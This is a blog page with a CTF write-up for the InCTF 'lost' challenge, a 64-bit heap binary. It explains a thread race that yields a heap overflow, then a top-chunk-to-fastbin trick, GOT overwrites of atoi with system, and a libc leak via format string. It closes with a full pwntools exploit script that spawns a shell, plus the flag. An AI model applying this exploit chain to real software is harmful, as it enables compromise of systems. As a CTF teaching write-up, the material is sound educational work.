<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1">
    <meta name=viewport content="width=device-width, initial-scale=1">
    <title>InCTF: lost Writeup &#8211; sherl0ck's home</title>
    <meta name="description" content="U">
    <meta name="keywords" content="writeup, fastbin, heap, race-condition">
    <link rel="canonical" href="http://localhost:4000/lost/">
        <!-- Twitter Cards -->
    <meta name="twitter:title" content="InCTF: lost Writeup">
    <meta name="twitter:description" content="U">
    <meta name="twitter:site" content="@sherl0ck__">
    <meta name="twitter:creator" content="@sherl0ck__">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:image" content="http://localhost:4000/assets/img/profile.png">
    <!-- Open Graph -->
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="article">
    <meta property="og:title" content="InCTF: lost Writeup">
    <meta property="og:description" content="U">
    <meta property="og:url" content="http://localhost:4000/lost/">
    <meta property="og:site_name" content="sherl0ck's home">
    <meta property="og:image" content="http://localhost:4000/assets/img/profile.png">

    
    
    <!-- Handheld -->
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Favicons -->
    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="http://localhost:4000/assets/img/favicon/apple-touch-icon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/assets/img/favicon/apple-touch-icon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/assets/img/favicon/apple-touch-icon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/assets/img/favicon/apple-touch-icon-144x144.png" />
<link rel="icon" type="image/png" href="http://localhost:4000/assets/img/favicon/favicon.png" />
<link rel="shortcut icon" href="http://localhost:4000/assets/img/favicon/favicon.png" />

    <!-- Feed -->
    <link rel="alternate" type="application/rss+xml" title="sherl0ck's home" href="http://localhost:4000/feed.xml" />
    <!-- CSS -->
    <link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/main.css">
</head>

  <body>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script type="text/javascript">
      $(function() {
        i = 0;
        $('.menuAc').css({
          'color': 'rgba(52, 152, 219, 1)'
        });
        $('.menuAc').click(function(){
          $(this).next('.menuMobil').animate({width:'toggle'},350);
          if (i%2==0) {
            $('.footer').css({
              'filter'         : 'blur(5px)'
            });
            $('.yazilar').css({
              'filter'         : 'blur(5px)'
            });
            $('.ust').css({
              'filter'         : 'blur(5px)'
            });
            $('ul.menu').css({
              'animation-duration': '0.1s'
            });
            i++;
          }
          else {
            $('.footer').css({
              'filter'         : 'blur(0px)'
            });
            $('.yazilar').css({
              'filter'         : 'blur(0px)'
            });
            $('.ust').css({
              'filter'         : 'blur(0px)'
            });
            i++;
          }

        });
      });
    </script>

    <div class="menuAc">
      <i class="fa fa-bars" aria-hidden="true"></i>
    </div>
    <div class="menuMobil">
          <nav class="nav-home">
      <ul class="menu">
            
				    
				    <li><a class="link" href="http://localhost:4000/" >Home</a></li>
				
				    
				    <li><a class="link" href="http://localhost:4000/blog/" >Blog</a></li>
				
				    
				    <li><a class="link" href="http://localhost:4000/projects/" >Projects</a></li>
				
				    
				    <li><a class="link" href="http://localhost:4000/about/" >About</a></li>
				
				    
				    <li><a class="link" href="http://localhost:4000/resume.pdf" >Resume</a></li>
				
        </ul>
    </nav>

    </div>
    <div class="ust">
      <div class="ortalaAna">
        <div class="baslikAna">
          sherl0ck's home
        </div>

        <div class="pc">
              <nav class="nav">
        <ul class="menuAna">
            
				    
				    <li class="item"><a class="link" href="http://localhost:4000/" >Home</a></li>
				
				    
				    <li class="item"><a class="link" href="http://localhost:4000/blog/" >Blog</a></li>
				
				    
				    <li class="item"><a class="link" href="http://localhost:4000/projects/" >Projects</a></li>
				
				    
				    <li class="item"><a class="link" href="http://localhost:4000/about/" >About</a></li>
				
				    
				    <li class="item"><a class="link" href="http://localhost:4000/resume.pdf" >Resume</a></li>
				
        </ul>
    </nav>

        </div>
      </div>
    </div>
    <div class="ortalaAna">
      <div class="yazilar">
        <div class="yazi">
          <div class="ustr">
            <h2>InCTF: lost Writeup</h2>
            <div class="yazibilgisi">
              12 Oct 2018
            </div>

          </div>
          <hr>
          <div class="content">
            <div class="entry">
            <div class=".post-tag">
              
              <i class="fa fa-tags" float=right></i>
              
              <a href="/blog/tag/#writeup"   class="post-tag">writeup</a>
              
              <a href="/blog/tag/#fastbin"   class="post-tag">fastbin</a>
              
              <a href="/blog/tag/#heap"   class="post-tag">heap</a>
              
              <a href="/blog/tag/#race-condition"   class="post-tag">race-condition</a>
              
              
            </div>
            <p><strong>Attachments</strong>: <a href="/assets/img/lost/lost">binary</a>     <a href="/assets/img/lost/libc.so.6">libc</a>     <a href="/assets/img/lost/lost.c">source</a></p>

<p>The binary is a 64-bit ELF, non-stripped. Here are the mitigation’s enforced.</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">gdb</span><span class="o">-</span><span class="nx">peda$</span> <span class="nx">checksec</span>
  <span class="nx">CANARY</span>    <span class="p">:</span> <span class="nx">ENABLED</span>
  <span class="nx">FORTIFY</span>   <span class="p">:</span> <span class="nx">disabled</span>
  <span class="nx">NX</span>        <span class="p">:</span> <span class="nx">ENABLED</span>
  <span class="nx">PIE</span>       <span class="p">:</span> <span class="nx">disabled</span>
  <span class="nx">RELRO</span>     <span class="p">:</span> <span class="nx">Partial</span>
</code></pre></div></div>
<p>Thats not much!</p>

<h2 id="reversing">Reversing</h2>

<p>The source code is provided along with this post. So you can quickly go through it. Basically the binary allocates chunks on the heap, stores the pointer to the chunk in a global variable named <code class="highlighter-rouge">ptr</code> and allows us to edit the chunk pointed to by <code class="highlighter-rouge">ptr</code>. The catch is that <code class="highlighter-rouge">ptr</code> is overwritten each time a new chunk is allocated, so it only contains the pointer to the last allocated chunk. Here’s a quick overview of the main functionalities -</p>

<ul>
  <li>
    <p><u>alloc</u> : This option asks the user how many chunks to allocate at a time (1 or 2) and, if 2, then creates a separate thread to allocate a second chunk (1 chunk is allocated by the main thread). The catch is that, if there are multi-threds, then each thread times out after 4 seconds. Oh, and we also can input an author name. The pointer to the heap chunk, the size and the pointer to author name are stored in global variable’s namely, <code class="highlighter-rouge">ptr</code>, <code class="highlighter-rouge">size</code> and <code class="highlighter-rouge">author</code>. So these are overwritten each time <code class="highlighter-rouge">alloc</code> is called.</p>
  </li>
  <li>
    <p><u>edit</u> : This allows us to edit the chunk pointed to by <code class="highlighter-rouge">ptr</code>, if one exists. We can only edit <code class="highlighter-rouge">size</code> bytes.</p>
  </li>
</ul>

<p><strong>Note</strong>: The <i>sem_****</i> methods are just there to guarantee synchronous behavior among the various threads and can be considered irrelevant in our exploit.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p>Race condition in <code class="highlighter-rouge">alloc</code> when the context switch between threads is taking place.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">do</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Enter Size %d: "</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
  <span class="n">size</span><span class="o">=</span><span class="n">getint</span><span class="p">();</span>
<span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="n">size</span><span class="o">&lt;=</span><span class="mi">0</span> <span class="o">||</span> <span class="n">size</span><span class="o">&gt;</span><span class="mi">1000</span><span class="p">);</span>
<span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Enter Author name : "</span><span class="p">);</span>
<span class="n">getinp</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">);</span>
<span class="n">author</span><span class="o">=</span><span class="n">strdup</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Enter Data %d: "</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
<span class="n">getinp</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</code></pre></div></div>
<p>So, in thread1, after the <code class="highlighter-rouge">malloc(size)</code> statement is executed, if we wait for 4 seconds, then thread2 begins execution. Now we give the <code class="highlighter-rouge">size</code> value as any integer above 1000, and again wait for 4 seconds so the control is passed back to thread1. Notice that in thread2, since the control never came out of the while loop, the <code class="highlighter-rouge">ptr</code> pointer was never reset, while now the <code class="highlighter-rouge">size</code> has been updated to a large value. So in thread1, in <code class="highlighter-rouge">getinp(ptr,size)</code> statement, we have a huge heap overflow.</p>

<p><strong>Note</strong>: Since there is no “view” functionality in the code, I saw no way to get a memory leak by just using the provided functions.</p>

<h2 id="exploit">Exploit</h2>

<p>Right, so we have a huge heap overflow now. So what do we do with that? There is no call to <code class="highlighter-rouge">free</code> in the code and neither is there a memory leak. This prevents us from using many traditional heap exploitation techniques. Also, due to lack of memory leaks, we can’t do a House of Orange.</p>

<p>Well, the aim is to use the heap extension functionality of <code class="highlighter-rouge">malloc</code> to free the top chunk such that the top chunk size lies in the fastbin range and then do a fastbin dup to bss segment (PIE is off, so we have the bss addresses). I’ve written about this method here - <a href="https://vigneshsrao.github.io//fastbin-dup/">vigneshsrao.github.io//fastbin-dup</a>. If something in this para was unclear, then please go through this post, which explains the method that we will be using, in more detail.</p>

<p>Okay, so lets get started. First use the heap overflow to change the size of the top chunk to a smaller (but page aligned) value. Now we will allocate chunk such that the size of the top chunk is just enough to hold another data chunk.</p>

<p>After the next data chunk has been allocated, the size of the top chunk should be <code class="highlighter-rouge">0x70(required)+0x20 = 0x90</code> bytes. The 0x20 bytes extra are for the misc usage of <code class="highlighter-rouge">malloc</code> while it extends the chunk.</p>

<p>Now we will set the <code class="highlighter-rouge">author</code> such that the size is more than 0x90. When <code class="highlighter-rouge">malloc</code> tries to service this request, it sees that that the size of the top chunk is too small and tries to extend the heap. Thus the current top chunk is freed (after 0x20 bytes have been taken out). But while freeing the top chunk, its size was 0x70 which is in the fastbin range. So this goes into the 0x70 size fastbin freelist instead of the unsorted bin.</p>

<p>And now finally we use the race condition a second time to get an overflow into the fastbin (freed top chunk) and edit its <code class="highlighter-rouge">fd</code> pointer.</p>

<p>Lets just quickly sum up what we did in the last couple of para’s</p>

<ul>
  <li>Make top chunk of size = 0x90 + sizeof(1 data chunk)</li>
  <li>
    <p>allocate the data chunk such that the size of the remaining top chunk = 0x90. Now in the same thread, allocate <code class="highlighter-rouge">author</code> such that its size is &gt; 0x90. This will lead to top getting freed and allocate the <code class="highlighter-rouge">author</code> in the extended heap segment. So this is how the heap would look-</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    misc chunks
--------------------
      chunk
--------------------
  freed top chunk
--------------------
--------------------
      author
--------------------
</code></pre></div>    </div>
  </li>
  <li>So now we use the race and get an overflow from the chunk just above the top. Thus we can overwrite the <code class="highlighter-rouge">fd</code> of 0x70 sized fastbin chunk.</li>
</ul>

<p>Since we know the bss address and all libc addresses start with 0x7f, we can use one GOT value as target for fastbin corruption. Lets use <code class="highlighter-rouge">stderr</code> GOT address for this. So we overwrite the <code class="highlighter-rouge">fd</code> of the free chunk with <code class="highlighter-rouge">stderr</code> GOT +5-8.
The + 5 for getting the size as 0x7f and -8 as we need to give the start of the chunk in <code class="highlighter-rouge">fd</code>.</p>

<p>Now the next time we allocate chunk of size 0x70 we are returned the previously freeed top chunk and in the next request for size 0x70, we get the chunk in bss, just below <code class="highlighter-rouge">stderr</code>.</p>

<p>Here’s how the area near <code class="highlighter-rouge">stderr</code> in bss looks like</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x6020c0 &lt;stdout@@GLIBC_2.2.5&gt;:	0x00007ffff7bb5620	0x0000000000000000
0x6020d0 &lt;stdin@@GLIBC_2.2.5&gt;:	0x00007ffff7bb48e0	0x0000000000000000
0x6020e0 &lt;stderr@@GLIBC_2.2.5&gt;:	0x00007ffff7bb5540	0x0000000000000000
0x6020f0 &lt;ptr&gt;:	0x0000000000000000	0x0000000000000000
0x602100 &lt;size&gt;:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120 &lt;sema&gt;:	0x0000000000000000	0x0000000000000000
0x602130 &lt;sema+16&gt;:	0x0000000000000000	0x0000000000000000
</code></pre></div></div>
<p>And here’s the area aligned as a heap chunk</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ x/xg 0x6020dd
0x6020dd:	0xfff7bb5540000000   &lt;--Chunk start
0x6020e5 &lt;stderr@@GLIBC_2.2.5+5&gt;:	0x000000000000007f
0x6020ed:	0x0000000000000000    &lt;-- We have write access from here
0x6020f5 &lt;ptr+5&gt;:	0x0000000000000000
0x6020fd &lt;author+5&gt;:	0x0000000000000000
0x602105:	0x0000000000000000
</code></pre></div></div>
<p>So we can basically overwrite the value of <code class="highlighter-rouge">ptr</code>. Lets overwrite this with GOT address of <code class="highlighter-rouge">atoi</code>. First to get a leak. For this edit the chunk (which is basically GOT of <code class="highlighter-rouge">atoi</code>) and make its value as PLT of <code class="highlighter-rouge">printf</code>. Then use format strings to leak out libc. After this edit the chunk again to overwrite <code class="highlighter-rouge">atoi</code> GOT with <code class="highlighter-rouge">system</code> address. Next time the prompt for option is presented, enter <code class="highlighter-rouge">/bin/sh</code> and booooom, you get a shell!</p>

<p>Here’s my exploit script for the same -</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">HOST</span><span class="o">=</span><span class="s">'localhost'</span>
<span class="n">PORT</span><span class="o">=</span><span class="mi">3333</span>


<span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./chall'</span><span class="p">)</span>

<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">opt</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter choice &gt;&gt; "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter new data: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">race_cond</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">size2</span><span class="p">,</span><span class="n">data2</span><span class="p">,</span><span class="n">size2_act</span><span class="p">,</span><span class="n">auth</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"How many chunks at a time (1/2) ? "</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">out</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">out</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">==</span><span class="s">'2'</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"unsuccessful"</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Sleep1 over"</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Size 2: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size2</span><span class="p">))</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Sleep2 over"</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">auth</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Data 1: "</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size2_act</span><span class="p">))</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Author name : "</span><span class="p">,</span><span class="n">auth</span><span class="p">)</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Data 2: "</span><span class="p">,</span><span class="n">data2</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">auth</span><span class="o">=</span><span class="s">'q'</span><span class="o">*</span><span class="mh">0xf0</span><span class="p">,</span><span class="n">l</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"How many chunks at a time (1/2) ? "</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Size 1: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Author name : "</span><span class="p">,</span><span class="n">auth</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Enter Author name : "</span><span class="p">,</span><span class="n">auth</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Data 1: "</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1000</span><span class="o">-</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"q"</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1000</span><span class="o">-</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"q"</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1000</span><span class="o">-</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"q"</span><span class="p">)</span>
    <span class="n">race_cond</span><span class="p">(</span><span class="mi">568</span><span class="p">,</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x230</span><span class="o">+</span><span class="s">"qqqqqqqq"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020dd</span><span class="p">),</span><span class="mi">10000</span><span class="p">,</span><span class="s">"aa"</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="s">"q"</span><span class="o">*</span><span class="p">(</span><span class="mh">0xf0</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">90</span><span class="p">,</span><span class="s">"q"</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">90</span><span class="p">,</span><span class="s">"qqq"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x602088</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400970</span><span class="p">))</span>
    <span class="n">menu</span><span class="p">(</span><span class="s">"</span><span class="si">%3</span><span class="s">$p##"</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"##"</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"##"</span><span class="p">,</span><span class="s">''</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x3da51d</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">l</span><span class="o">=</span><span class="mh">0x602088</span>
    <span class="n">menu</span><span class="p">(</span><span class="s">"11"</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter new data: "</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
    <span class="n">menu</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>

    <span class="n">success</span><span class="o">=</span><span class="bp">False</span>
    <span class="k">while</span><span class="p">(</span><span class="ow">not</span> <span class="n">success</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
            <span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">r</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./chall'</span><span class="p">)</span>
        <span class="n">success</span><span class="o">=</span><span class="n">race_cond</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xea1</span><span class="p">),</span><span class="mi">10000</span><span class="p">,</span><span class="s">"12"</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="s">"QQQQ"</span><span class="p">)</span>

    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"successful"</span><span class="p">)</span>
    <span class="n">exploit</span><span class="p">()</span>
    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>And the flag was</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>InCTF{w1n_th3_r4c3_t0_r0mp_1n_the_h34p}
</code></pre></div></div>

<p>Hope you enjoyed this challenge and our CTF !</p>

            <!-- 
            <a href="/feedback/" title="InCTF: feedback Writeup" class="btn btn-info">&larr; Previous</a>
            
             -->
            <!-- [ previous](https://github.com/alperenbozkurt/JBlog){: .btn .btn-info} -->

            
            <div class="PageNavigation">
              
                
                  <a class="previous" href="/feedback/">&laquo; InCTF: feedback Writeup</a>
                
              
              
            </div>
            
            <div style="clear:both"></div>
          </div>
         	</div>

        </div>
        <script src="http://localhost:4000/assets/js/jquery-1.12.2.min.js"></script>
<script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script>
<script type="text/javascript">
$(document).ready(function(){
    $.goup({
        trigger: 500,
        bottomOffset: 10,
        locationOffset: 20,
        containerRadius: 0,
        containerColor: '#fff',
        arrowColor: '#000',
        goupSpeed: 'normal'
    });
});
</script>

<!-- Asynchronous Google Analytics snippet -->
<script>
  var _gaq = _gaq || [];
  var pluginUrl =
 '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
  _gaq.push(['_setAccount', 'UA-123721864-1']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


        
  <div id="disqus_thread" class="yazi">  </div>
  <script>

  /**
  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
  /*
  var disqus_config = function () {
  this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
  this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
  };
  */
  (function() { // DON'T EDIT BELOW THIS LINE
  var d = document, s = d.createElement('script');
  s.src = 'https://sherl0ck.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
  })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

  <script id="dsq-count-scr" src="//sherl0ck.disqus.com/count.js" async></script>


      </div>
    </div>

        <div class="footer">
      <div class="ortalaAna">
        <div class="copy">
          sherl0ck's home © 2018
        </div>
        <div class="sosyal">
                        <div class="social-links">
                  <a href="mailto:vigneshsrao5@gmail.com" class="author-social" target="_blank"><i class="fa fa-2x fa-envelope-square"></i></a>
                  <a href="http://twitter.com/sherl0ck__" class="author-social" target="_blank"><i class="fa fa-2x fa-twitter-square"></i></a>
                  
                  
                  <a href="http://linkedin.com/in/vigneshsrao" class="author-social" target="_blank"><i class="fa fa-2x fa-linkedin-square"></i></a>
                  
                  
                  
                  <a href="http://github.com/vigneshsrao" class="author-social" target="_blank"><i class="fa fa-2x fa-github"></i></a>
                  
                  
                  
                  
                  
                  
                  
                  
                  
                  
                  
            </div>

        </div>
      </div>
    </div>

  </body>
</html>

<!-- 
<i class="previous"><a href="/feedback/" title="InCTF: feedback Writeup">&larr; Previous</a></i>


<li class="next disabled"><a>Next &rarr;</a>
 -->
